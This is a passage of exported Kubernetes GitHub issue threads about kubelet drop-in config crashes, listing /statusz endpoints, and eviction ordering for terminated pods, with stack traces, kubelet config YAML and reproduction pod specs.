just one space or an newline in that file it crashes with:\r\n```\r\n>kubelet --config-dir /etc/kubernetes/kubelet.conf.d --config /var/lib/kubelet/config.yaml\r\nE0510 13:49:26.243517    9062 run.go:74] \"command failed\" err=<\r\n        failed to merge kubelet configs: failed to walk through kubelet dropin directory \"/etc/kubernetes/kubelet.conf.d\": failed to load kubelet dropin file, path: /etc/kubernetes/kubelet.conf.d/20-kubelet.conf, error: Object 'Kind' is missing in '\r\n        '\r\n```\r\nEven when the docs say:\r\n\r\n> These files may contain partial configurations and might not be valid config files by themselves. Validation is only performed on the final resulting configuration structure stored internally in the kubelet. \r\n\r\nIf there is nothing or only whitspaces in  `/etc/kubernetes/kubelet.conf.d` the merged config should not be invalid and not every file in `/etc/kubernetes/kubelet.conf.d` must contain a `kind` property.\r\n\r\n**Setup 2**:\r\nThe `/etc/kubernetes/kubelet.conf.d/20-kubelet.conf` is the same as the `/var/lib/kubelet/config.yaml` the kubelet panics and crashes with:\r\n```\r\n> kubelet --config-dir /etc/kubernetes/kubelet.conf.d --config /var/lib/kubelet/config.yaml\r\npanic: non-positive interval for NewTicker\r\n\r\ngoroutine 1 [running]:\r\ntime.NewTicker(0xc00098f7a0?)\r\n        time/tick.go:22 +0xe5\r\nk8s.io/klog/v2/internal/clock.RealClock.NewTicker(...)\r\n        k8s.io/klog/v2@v2.120.1/internal/clock/clock.go:111\r\nk8s.io/klog/v2.(*flushDaemon).run(0xc000229650, 0x0)\r\n        k8s.io/klog/v2@v2.120.1/klog.go:1169 +0x10f\r\nk8s.io/klog/v2.StartFlushDaemon(0x0)\r\n        k8s.io/klog/v2@v2.120.1/klog.go:1220 +0x36\r\nk8s.io/component-base/logs/api/v1.apply(0xc0008c8a38, 0x0, {0x7f1ede53b2f0, 0xc000557130})\r\n        k8s.io/component-base/logs/api/v1/options.go:285 +0x890\r\nk8s.io/component-base/logs/api/v1.validateAndApply(0xc0008c8a38, 0x0, {0x7f1ede53b2f0, 0xc000557130}, 0x4?)\r\n        k8s.io/component-base/logs/api/v1/options.go:132 +0x71\r\nk8s.io/component-base/logs/api/v1.ValidateAndApplyAsField(...)\r\n        k8s.io/component-base/logs/api/v1/options.go:124\r\nk8s.io/kubernetes/cmd/kubelet/app.NewKubeletCommand.func1(0xc0000d8908, {0xc000100060, 0x4, 0x4})\r\n        k8s.io/kubernetes/cmd/kubelet/app/server.go:238 +0x4bc\r\ngithub.com/spf13/cobra.(*Command).execute(0xc0000d8908, {0xc000100060, 0x4, 0x4})\r\n        github.com/spf13/cobra@v1.7.0/command.go:940 +0x882\r\ngithub.com/spf13/cobra.(*Command).ExecuteC(0xc0000d8908)\r\n        github.com/spf13/cobra@v1.7.0/command.go:1068 +0x3a5\r\ngithub.com/spf13/cobra.(*Command).Execute(...)\r\n        github.com/spf13/cobra@v1.7.0/command.go:992\r\nk8s.io/component-base/cli.run(0xc0000d8908)\r\n        k8s.io/component-base/cli/run.go:146 +0x290\r\nk8s.io/component-base/cli.Run(0xc0000061c0?)\r\n        k8s.io/component-base/cli/run.go:46 +0x17\r\nmain.main()\r\n        k8s.io/kubernetes/cmd/kubelet/kubelet.go:36 +0x18\r\n```\r\nUsing the same config only via `--config` works.\r\n\r\n### What did you expect to happen?\r\n\r\nThe kubelet should start with empty files in `/etc/kubernetes/kubelet.conf.d` or if the files in `/var/lib/kubelet/config.yaml` and `/etc/kubernetes/kubelet.conf.d` are the same.\r\n\r\nIf this is not the expected usage, the docs have to be adjusted. \r\n\r\n### How can we reproduce it (as minimally and precisely as possible)?\r\n\r\nCreate a cluster with kubeadm v1.30 with kublet config in `/var/lib/kubelet/config.yaml` and `/etc/kubernetes/kubelet.conf.d` or setup kubelet by hand. \r\n\r\n```yaml\r\n# kubeadm config\r\napiVersion: kubeadm.k8s.io/v1beta3\r\nkind: InitConfiguration\r\n\r\nnodeRegistration:\r\n  kubeletExtraArgs:\r\n    config: /var/lib/kubelet/config.yaml\r\n    config-dir: /etc/kubernetes/kubelet.conf.d\r\n``` \r\n\r\n\r\n### Anything else we need to know?\r\n\r\nThe kublet conf api version is `apiVersion: kubelet.config.k8s.io/v1beta1` and is was with and without setting `KUBELET_CONFIG_DROPIN_DIR_ALPHA`\r\n\r\nFunctionality was introduced in #119390\r\n\r\n### Kubernetes version\r\n\r\n<details>\r\n\r\n```console\r\n$ kubectl version\r\nClient Version: v1.30.0\r\nKustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3\r\n$ kubeadm version\r\nkubeadm version: &version.Info{Major:\"1\", Minor:\"30\", GitVersion:\"v1.30.0\", GitCommit:\"7c48c2bd72b9bf5c44d21d7338cc7bea77d0ad2a\", GitTreeState:\"clean\", BuildDate:\"2024-04-17T17:34:08Z\", GoVersion:\"go1.22.2\", Compiler:\"gc\", Platform:\"linux/amd64\"}\r\n```\r\n\r\n</details>\r\n\r\n\r\n### Cloud provider\r\n\r\n<details>\r\nHetzner/None\r\n</details>\r\n\r\n\r\n### OS version\r\n\r\n<details>\r\n\r\n```console\r\n# On Linux:\r\n$ cat /etc/os-release\r\nPRETTY_NAME=\"Debian GNU/Linux 12 (bookworm)\"\r\nNAME=\"Debian GNU/Linux\"\r\nVERSION_ID=\"12\"\r\nVERSION=\"12 (bookworm)\"\r\nVERSION_CODENAME=bookworm\r\nID=debian\r\nHOME_URL=\"https://www.debian.org/\"\r\nSUPPORT_URL=\"https://www.debian.org/support\"\r\nBUG_REPORT_URL=\"https://bugs.debian.org/\"\r\n$ uname -a\r\nLinux controlplane-node-amd64-vcxkzu 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64 GNU/Linux\r\n\r\n# On Windows:\r\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\r\n# paste output here\r\n```\r\n\r\n</details>\r\n\r\n\r\n### Install tools\r\n\r\n<details>\r\nkubeadm\r\n</details>\r\n\r\n\r\n### Container runtime (CRI) and version (if applicable)\r\n\r\n<details>\r\ncontainerd github.com/containerd/containerd v1.7.16\r\n</details>\r\n\r\n\r\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\r\n\r\n<details>\r\nnot relevant\r\n</details>\r\n", "issue_labels": ["kind/bug", "sig/node", "triage/accepted"], "comments": [{"author": "ffromani", "body": "/sig node"}, {"author": "carlory", "body": "I think it is a doc issue for `step 1`.\r\n\r\nFrom [KEP](https://github.com/kubernetes/enhancements/blob/master/keps/sig-node/3983-drop-in-configuration/README.md#proposal), it said,\r\n\r\n```\r\nIf there are any issues with the drop-ins (e.g. formatting errors), the error will be reported in the same way as a misconfigured kubelet.conf file\r\n```"}, {"author": "hegerdes", "body": "> I think it is a doc issue for `step 1`.\r\n> \r\n> From [KEP](https://github.com/kubernetes/enhancements/blob/master/keps/sig-node/3983-drop-in-configuration/README.md#proposal), it said,\r\n> \r\n> ```\r\n> If there are any issues with the drop-ins (e.g. formatting errors), the error will be reported in the same way as a misconfigured kubelet.conf file\r\n> ```\r\n\r\nJust to be sure I recreated the setup given in the KEP. It did not work. Every file in the drop-ins seems to be required to have a `kind` (which suggest the validation is not just done at the end) and empty files produce an error.\r\n\r\nThere seems to be something wrong while merging the files."}, {"author": "saschagrunert", "body": "cc @haircommander @yuqi-zhang @sohankunkerkar @harche "}, {"author": "haircommander", "body": "yeah the documentation doesn't match the behavior. I think we need to keep the behavior this way, where the kubelet fails on any invalid configuration file, because an admin's intent may not be fulfilled in the resulting configuration if we skip the invalid configs and continue the config resolution without taking the funky one into account. @sohankunkerkar do you have bandwidth to update the docs?"}, {"author": "sohankunkerkar", "body": "> yeah the documentation doesn't match the behavior. I think we need to keep the behavior this way, where the kubelet fails on any invalid configuration file, because an admin's intent may not be fulfilled in the resulting configuration if we skip the invalid configs and continue the config resolution without taking the funky one into account. @sohankunkerkar do you have bandwidth to update the docs?\r\n\r\n+1 to what @haircommander said. Let me go ahead and update the docs."}, {"author": "ffromani", "body": "/triage accepted\r\n\r\nper https://github.com/kubernetes/kubernetes/issues/124796#issuecomment-2107530974 and https://github.com/kubernetes/kubernetes/issues/124796#issuecomment-2107584048"}, {"author": "ffromani", "body": "I think in the case/step 2 described above the kubelet should preferably abort like it does in the case/step1 rather than crash with a stacktrace. Perhaps a stretch goal?"}, {"author": "hegerdes", "body": "Nice, thanks for updating the docs so fast.\r\n\r\nJust wanted to check in what's up with problem 2 described in _Setup 2_. Should this be reopened or is a new Issue needed?"}, {"author": "carlory", "body": "/reopen\r\n\r\nFor problem 2 described in Setup 2"}, {"author": "k8s-ci-robot", "body": "@carlory: Reopened this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/124796#issuecomment-2122204993):\n\n>/reopen\r\n>\r\n>For problem 2 described in Setup 2\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "haircommander", "body": "/assign @sohankunkerkar "}, {"author": "liggitt", "body": "The drop-in files must minimally identify themselves as kubelet config files (valid apiVersion / kind), and the docs should reflect that"}, {"author": "hegerdes", "body": "> The drop-in files must minimally identify themselves as kubelet config files (valid apiVersion / kind), and the docs should reflect that\r\n\r\nYes, this section has been added to the docs and now the docs and implementation aligns.\r\n\r\nThe second issue I encountered was that I used the exact same config (with api version and kind) via `--config` and as an drop-in config file and the kubelet crashed with the above error. (See setup 2) Are `--config` and the `--config-dir` meant to be mutually exclusive? Which one takes precedence over the over? Both in terms of flags and config file.\r\n\r\nI have not confirmed in recent time that specifying both with the same config still results in a crash but I can check again next week with k8s 1.31\r\n\r\n"}, {"author": "sohankunkerkar", "body": ">The second issue I encountered was that I used the exact same config (with api version and kind) via --config and as an drop-in config file and the kubelet crashed with the above error. (See setup 2) Are --config and the --config-dir meant to be mutually exclusive? Which one takes precedence over the over? Both in terms of flags and config file.\r\n\r\nThese two options are not mutually exclusive; they are designed to work together. When both are used, the kubelet should first load the configuration from the `--config` file and then apply any settings from the files in the `--config-dir`, with the latter taking precedence. This means that if there are conflicting settings, those in the drop-in directory will override those specified in the primary configuration file. Regarding the issue, the kubelet should be able to handle such scenarios gracefully without resulting in a crash. I will work on it once the enhancement freeze is over."}, {"author": "hegerdes", "body": "I retested the bug with k8s 1.32.2 and I can confirm that it still occures.\r\n\r\nSetting the content below in `/etc/kubernetes/kubelet.conf.d/99-kubelet-default.conf` and starting the kubelet with `--config-dir /etc/kubernetes/kubelet.conf.d` will crash the kubelet with this log:\r\n\r\n```\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 systemd[1]: Started kubelet.service - kubelet: The Kubernetes Node Agent.\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]: Flag --container-runtime-endpoint has been deprecated, This parameter should be set via the config file specified by the Kubelet's --config flag. See https://kubernetes.io/docs/tasks/administer-cluster/kubelet-config-file/ for more information.\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]: Flag --pod-infra-container-image has been deprecated, will be removed in a future release. Image garbage collector will get sandbox image information from CRI.\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]: I1025 15:05:13.262673    3895 server.go:211] \"--pod-infra-container-image will not be pruned by the image garbage collector in kubelet and should also be set in the remote runtime\"\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]: panic: non-positive interval for NewTicker\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]: goroutine 1 [running]:\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]: time.NewTicker(0xc000477718?)\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]:         time/tick.go:22 +0xe5\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]: k8s.io/klog/v2/internal/clock.RealClock.NewTicker(...)\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]:         k8s.io/klog/v2@v2.130.1/internal/clock/clock.go:111\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]: k8s.io/klog/v2.(*flushDaemon).run(0xc0002611a0, 0x0)\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]:         k8s.io/klog/v2@v2.130.1/klog.go:1136 +0x10f\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]: k8s.io/klog/v2.StartFlushDaemon(0x0)\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]:         k8s.io/klog/v2@v2.130.1/klog.go:1187 +0x36\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]: k8s.io/component-base/logs/api/v1.apply(0xc000872438, 0x0, {0x7fbeacb02610, 0xc0004d7b90})\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]:         k8s.io/component-base/logs/api/v1/options.go:286 +0x896\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]: k8s.io/component-base/logs/api/v1.validateAndApply(0xc000872438, 0x0, {0x7fbeacb02610, 0xc0004d7b90}, 0x79?)\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]:         k8s.io/component-base/logs/api/v1/options.go:132 +0x71\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]: k8s.io/component-base/logs/api/v1.ValidateAndApplyAsField(...)\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]:         k8s.io/component-base/logs/api/v1/options.go:124\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]: k8s.io/kubernetes/cmd/kubelet/app.NewKubeletCommand.func1(0xc0003db208, {0xc0001340a0, 0x8, 0x8})\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]:         k8s.io/kubernetes/cmd/kubelet/app/server.go:244 +0x4bf\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]: github.com/spf13/cobra.(*Command).execute(0xc0003db208, {0xc0001340a0, 0x8, 0x8})\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]:         github.com/spf13/cobra@v1.8.1/command.go:985 +0xaca\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]: github.com/spf13/cobra.(*Command).ExecuteC(0xc0003db208)\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]:         github.com/spf13/cobra@v1.8.1/command.go:1117 +0x3ff\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]: github.com/spf13/cobra.(*Command).Execute(...)\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]:         github.com/spf13/cobra@v1.8.1/command.go:1041\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]: k8s.io/component-base/cli.run(0xc0003db208)\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]:         k8s.io/component-base/cli/run.go:143 +0x245\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]: k8s.io/component-base/cli.Run(0xc0000061c0?)\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]:         k8s.io/component-base/cli/run.go:44 +0x17\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]: main.main()\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 kubelet[3895]:         k8s.io/kubernetes/cmd/kubelet/kubelet.go:36 +0x18\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 systemd[1]: kubelet.service: Main process exited, code=exited, status=2/INVALIDARGUMENT\r\nOct 25 15:05:13 worker-node-amd64-7ei6n5 systemd[1]: kubelet.service: Failed with result 'exit-code'.\r\nOct 25 15:05:23 worker-node-amd64-7ei6n5 systemd[1]: kubelet.service: Scheduled restart job, restart counter is at 134.\r\n```\r\n\r\nThe content of `99-kubelet-default.conf`:\r\n```yaml\r\n# kubelet config\r\napiVersion: kubelet.config.k8s.io/v1beta1\r\nkind: KubeletConfiguration\r\n\r\nauthentication:\r\n  anonymous:\r\n    enabled: false\r\n  webhook:\r\n    cacheTTL: 0s\r\n    enabled: true\r\n  x509:\r\n    clientCAFile: \"/etc/kubernetes/pki/ca.crt\"\r\nauthorization:\r\n  mode: Webhook\r\n  webhook:\r\n    cacheAuthorizedTTL: 0s\r\n    cacheUnauthorizedTTL: 0s\r\n\r\n# See https://kubernetes.io/docs/reference/access-authn-authz/kubelet-tls-bootstrapping/\r\nrotateCertificates: true\r\nserverTLSBootstrap: true\r\n\r\ncontainerRuntimeEndpoint: unix:///run/containerd/containerd.sock\r\nclusterDomain: cluster.local\r\nclusterDNS: [10.96.0.10]\r\n\r\nmaxPods: 220\r\nimageGCLowThresholdPercent: 70\r\nprotectKernelDefaults: true\r\nnodeStatusMaxImages: 100\r\nserializeImagePulls: false\r\nstaticPodPath: /etc/kubernetes/manifests\r\nmaxParallelImagePulls: 8\r\ncgroupDriver: systemd\r\nfailSwapOn: true\r\nstreamingConnectionIdleTimeout: 0s\r\nsyncFrequency: 0s\r\nvolumeStatsAggPeriod: 0s\r\nruntimeRequestTimeout: 0s\r\nnodeStatusReportFrequency: 0s\r\nnodeStatusUpdateFrequency: 0s\r\nhttpCheckFrequency: 0s\r\nreadOnlyPort: 0\r\nimageMaximumGCAge: 0s\r\nimageMinimumGCAge: 0s\r\nfileCheckFrequency: 0s\r\ncpuManagerReconcilePeriod: 0s\r\nevictionPressureTransitionPeriod: 0s\r\n\r\nlogging:\r\n  flushFrequency: 0\r\n  options:\r\n    json:\r\n      infoBufferSize: \"0\"\r\n\r\n\r\n```"}, {"author": "liggitt", "body": "> I retested the bug with k8s 1.32.2 and I can confirm that it still occures.\r\n\r\n1.32 is not released yet. Did you mean 1.31.2?\r\n\r\nThe fix to apply defaulting to config files loaded from the config dir is only in 1.32 dev builds (https://github.com/kubernetes/kubernetes/pull/127421)"}, {"author": "hegerdes", "body": "> > I retested the bug with k8s 1.32.2 and I can confirm that it still occures.\r\n> \r\n> 1.32 is not released yet. Did you mean 1.31.2?\r\n> \r\n> The fix to apply defaulting to config files loaded from the config dir is only in 1.32 dev builds (#127421)\r\n\r\nSorry, was indeed a typo. Tested `Kubernetes v1.31.2`"}, {"author": "liggitt", "body": "is this still an issue:\n\n```\nSetup 2:\nThe /etc/kubernetes/kubelet.conf.d/20-kubelet.conf is the same as the /var/lib/kubelet/config.yaml the kubelet panics and crashes with:\n\n> kubelet --config-dir /etc/kubernetes/kubelet.conf.d --config /var/lib/kubelet/config.yaml\npanic: non-positive interval for NewTicker\n\ngoroutine 1 [running]:\ntime.NewTicker(0xc00098f7a0?)\n        time/tick.go:22 +0xe5\nk8s.io/klog/v2/internal/clock.RealClock.NewTicker(...)\n        k8s.io/klog/v2@v2.120.1/internal/clock/clock.go:111\nk8s.io/klog/v2.(*flushDaemon).run(0xc000229650, 0x0)\n        k8s.io/klog/v2@v2.120.1/klog.go:1169 +0x10f\nk8s.io/klog/v2.StartFlushDaemon(0x0)\n        k8s.io/klog/v2@v2.120.1/klog.go:1220 +0x36\nk8s.io/component-base/logs/api/v1.apply(0xc0008c8a38, 0x0, {0x7f1ede53b2f0, 0xc000557130})\n        k8s.io/component-base/logs/api/v1/options.go:285 +0x890\nk8s.io/component-base/logs/api/v1.validateAndApply(0xc0008c8a38, 0x0, {0x7f1ede53b2f0, 0xc000557130}, 0x4?)\n        k8s.io/component-base/logs/api/v1/options.go:132 +0x71\nk8s.io/component-base/logs/api/v1.ValidateAndApplyAsField(...)\n        k8s.io/component-base/logs/api/v1/options.go:124\nk8s.io/kubernetes/cmd/kubelet/app.NewKubeletCommand.func1(0xc0000d8908, {0xc000100060, 0x4, 0x4})\n        k8s.io/kubernetes/cmd/kubelet/app/server.go:238 +0x4bc\ngithub.com/spf13/cobra.(*Command).execute(0xc0000d8908, {0xc000100060, 0x4, 0x4})\n        github.com/spf13/cobra@v1.7.0/command.go:940 +0x882\ngithub.com/spf13/cobra.(*Command).ExecuteC(0xc0000d8908)\n        github.com/spf13/cobra@v1.7.0/command.go:1068 +0x3a5\ngithub.com/spf13/cobra.(*Command).Execute(...)\n        github.com/spf13/cobra@v1.7.0/command.go:992\nk8s.io/component-base/cli.run(0xc0000d8908)\n        k8s.io/component-base/cli/run.go:146 +0x290\nk8s.io/component-base/cli.Run(0xc0000061c0?)\n        k8s.io/component-base/cli/run.go:46 +0x17\nmain.main()\n        k8s.io/kubernetes/cmd/kubelet/kubelet.go:36 +0x18\n```\n\nif so, that seems like a specific issue to route to the folks working on log config application"}, {"author": "SergeyKanzhelev", "body": "KEP link: https://github.com/kubernetes/enhancements/issues/3983\n\n@haircommander @sohankunkerkar can either of you take a look?"}, {"author": "hegerdes", "body": "> is this still an issue\n\nI can confirm that the crashing kubelet when supplying duplicate configs via `--config` and `--config-dir` is not a problem anymore in kubernetes `v1.33.1`. \n\nI can not say if there is any other issue regarding the logger, but for me this seems to be fixed and can be closed."}, {"author": "sohankunkerkar", "body": "We added some coverage here: https://github.com/kubernetes/kubernetes/pull/129460"}, {"author": "liggitt", "body": "let's close and file a new specific issue if someone still has problems with merging specific fields"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133182, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133182", "issue_title": "List available endpoints for kube-controller-manager's /statusz ", "issue_author": "richabanker", "issue_body": "Sub-issue of https://github.com/kubernetes/kubernetes/issues/132474\n\nAdd additional text of \"Paths:\" with available paths of kube-controller-manager:\n\n\"/livez\"\n\"/readyz\"\n\"/healthz\"\n\"/metrics\"\n\n/sig instrumentation", "issue_labels": ["help wanted", "sig/instrumentation", "good first issue", "triage/accepted"], "comments": [{"author": "richabanker", "body": "/triage accepted"}, {"author": "richabanker", "body": "/help\n/good first issue"}, {"author": "k8s-ci-robot", "body": "@richabanker: \n\tThis request has been marked as needing help from a contributor.\n\n### Guidelines\nPlease ensure that the issue body includes answers to the following questions:\n- Why are we solving this issue?\n- To address this issue, are there any code changes? If there are code changes, what needs to be done in the code and what places can the assignee treat as reference points?\n- How can the assignee reach out to you for help?\n\n\nFor more details on the requirements of such an issue, please see [here](https://www.kubernetes.dev/docs/guide/help-wanted/) and ensure that they are met.\n\nIf this request no longer meets these requirements, the label can be removed\nby commenting with the `/remove-help` command.\n\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133182):\n\n>/help\n>/good first issue\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "richabanker", "body": "cc @nmn3m\n\n"}, {"author": "richabanker", "body": "/good-first-issue"}, {"author": "k8s-ci-robot", "body": "@richabanker: \n\tThis request has been marked as suitable for new contributors.\n\n### Guidelines\nPlease ensure that the issue body includes answers to the following questions:\n- Why are we solving this issue?\n- To address this issue, are there any code changes? If there are code changes, what needs to be done in the code and what places can the assignee treat as reference points?\n- How can the assignee reach out to you for help?\n\n\nFor more details on the requirements of such an issue, please see [here](https://www.kubernetes.dev/docs/guide/help-wanted/#good-first-issue) and ensure that they are met.\n\nIf this request no longer meets these requirements, the label can be removed\nby commenting with the `/remove-good-first-issue` command.\n\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133182):\n\n>/good-first-issue\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "nmn3m", "body": "/assign"}, {"author": "citymaus", "body": "/assign"}, {"author": "Whitea029", "body": "/assign"}, {"author": "Yash-xoxo", "body": "**Code Changes Required:**\nThis is a documentation-only change. The work is to insert text with \"Paths:\" followed by the endpoints that are available:\n\n/livez - Liveness endpoint\n/readyz - Readiness endpoint\n/healthz - Health endpoint (deprecated but remains supported)\n/metrics - Metrics endpoint\n\n**Reference Points:**\n\nThe primary kube-controller-manager documentation page\nComparable documentation patterns utilized for other Kubernetes components\nThe documentation on health endpoints at kubernetes.io/docs/reference/using-api/health-checks/\n\n**Technical Context:**\nThe described endpoints have different functions:\n\n/healthz is the older health check endpoint\n/livez reports whether the component is alive and responsive\n/readyz reports whether the component is ready to handle requests\n/metrics serves up Prometheus-style metrics for monitoring\n\nThis is flagged as a good first issue because it's a simple doc update which doesn't need intimate knowledge of the codebase, only familiarity with where to put the doc and following existing conventions."}]}
{"repo": "kubernetes/kubernetes", "issue_number": 128790, "issue_url": "https://github.com/kubernetes/kubernetes/issues/128790", "issue_title": "Eviction manager should evict terminated pods before running pods", "issue_author": "AnishShah", "issue_body": "### What happened?\r\n\r\nConsider two pods are running on the node:\r\n1.  pod with a large image size but in terminated state.\r\n2.  running pod which is utilizing disk space just above the eviction limit.\r\n\r\nkubelet's eviction manager will evict the running pod first instead of evicting the terminated pod and cleaning up the image.\r\n\r\n### What did you expect to happen?\r\n\r\nkubelet should evict terminated pods and clean up images first beforing deciding to evict the running pod.\r\n\r\n### How can we reproduce it (as minimally and precisely as possible)?\r\n\r\n1. create a pod with large image size and let it run to completion (you can write some data to writable layers if there's no large image).\r\n2. create a pod with different image but it should utilize disk space until eviction limit.\r\n3. watch kubelet evict the running pod first.\r\n\r\n### Anything else we need to know?\r\n\r\nI think we should modify our node reclaim funcs to prioritize terminated pods first - https://github.com/kubernetes/kubernetes/blob/c9092f69fc0c099062dd23cd6ee226bcd52ec790/pkg/kubelet/eviction/helpers.go#L1222\r\n\r\n### Kubernetes version\r\n\r\n<details>\r\n\r\n```console\r\n$ kubectl version\r\n1.31\r\n```\r\n\r\n</details>\r\n\r\n\r\n### Cloud provider\r\n\r\n<details>\r\n\r\n</details>\r\n\r\n\r\n### OS version\r\n\r\n<details>\r\n\r\n```console\r\n# On Linux:\r\n$ cat /etc/os-release\r\n# paste output here\r\n$ uname -a\r\n# paste output here\r\n\r\n# On Windows:\r\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\r\n# paste output here\r\n```\r\n\r\n</details>\r\n\r\n\r\n### Install tools\r\n\r\n<details>\r\n\r\n</details>\r\n\r\n\r\n### Container runtime (CRI) and version (if applicable)\r\n\r\n<details>\r\n\r\n</details>\r\n\r\n\r\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\r\n\r\n<details>\r\n\r\n</details>\r\n", "issue_labels": ["kind/bug", "sig/node", "triage/accepted"], "comments": [{"author": "AnishShah", "body": "/sig node\r\n/triage accepted\r\n/cc @yujuhong "}, {"author": "AnishShah", "body": "/assign @KevinTMtz"}, {"author": "k8s-ci-robot", "body": "@AnishShah: GitHub didn't allow me to assign the following users: KevinTMtz.\n\nNote that only [kubernetes members](https://github.com/orgs/kubernetes/people) with read permissions, repo collaborators and people who have commented on this issue/PR can be assigned. Additionally, issues/PRs can only have 10 assignees at the same time.\nFor more information please see [the contributor guide](https://git.k8s.io/community/contributors/guide/first-contribution.md#issue-assignment-in-github)\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/128790#issuecomment-2474525757):\n\n>/assign @KevinTMtz\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "KevinTMtz", "body": "/assign"}, {"author": "hshiina", "body": "`DeleteAllUnusedContainers()` looks to already delete terminated pods.\n\nI tried running the following pods on my laptop with kind where `eviction-hard` is `nodefs.available<(availableBytes)-1GB`:\n\n```\napiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    run: termpod\n  name: termpod\nspec:\n  containers:\n  - command:\n    - sh\n    - -c\n    - dd if=/dev/random of=largefile bs=1048576 count=500 2>/dev/null\n    image: busybox\n    name: termcontainer\n    resources: {}\n  dnsPolicy: ClusterFirst\n  restartPolicy: Never\n---\napiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    run: activepod\n  name: activepod\nspec:\n  containers:\n  - command:\n    - sh\n    - -c\n    - for i in `seq 800`; do dd if=/dev/random of=file${i} bs=1048576 count=1 2>/dev/null; sleep .1; done;\n    image: busybox\n    name: activecontainer\n    resources: {}\n  dnsPolicy: ClusterFirst\n  restartPolicy: Never\n```\n\nThese pods are expected to work as following:\n1. `termpod` gets terminated after consuming 500MB.\n2. When `activepod` consumes 500MB, `termpod` is evicted, which means the container and sandbox are deleted in the runtime.\n3. `activepod` gets completed without being evicted.\n\nAs far as I tried a few times, there were both cases where `activepod` gets succeeded and evicted.\n\nI suspect the disk usage might be updated asynchronously after the terminated pod is deleted so that the summary might has an older value:\nhttps://github.com/kubernetes/kubernetes/blob/f3cbd79db7f0c86a2d3602fdff6b174543d2cf1c/pkg/kubelet/eviction/eviction_manager.go#L477\n"}, {"author": "AnishShah", "body": "@hshiina , `DeleteAllUnusedContainers` does not delete terminated pods by default. It deletes terminated pods only if you use the deprecated flag [`minimum-container-ttl-duration`](https://github.com/kubernetes/kubernetes/blob/master/cmd/kubelet/app/options/options.go#L313C44-L313C74).\n\nCan you check if you're using that?"}, {"author": "hshiina", "body": "> [@hshiina](https://github.com/hshiina) , `DeleteAllUnusedContainers` does not delete terminated pods by default. It deletes terminated pods only if you use the deprecated flag 